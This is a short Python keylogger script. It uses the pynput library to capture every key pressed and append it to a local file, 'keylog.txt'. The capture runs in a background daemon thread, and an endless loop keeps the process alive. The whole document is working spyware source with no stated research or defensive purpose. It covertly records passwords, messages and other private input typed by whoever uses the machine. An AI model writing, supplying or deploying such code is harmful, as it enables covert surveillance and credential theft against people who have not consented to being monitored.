import pynput
from pynput.keyboard import Key, Listener
import os
import threading

def on_press(key):
    try:
        with open('keylog.txt', 'a') as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        if key == Key.space:
            with open('keylog.txt', 'a') as f:
                f.write(' ')
        else:
            with open('keylog.txt', 'a') as f:
                f.write(f'{key}\n')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def run_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    # Create a new thread for the keylogger
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    # Keep the program running in the background
    while True:
        pass

if __name__ == '__main__':
    main()
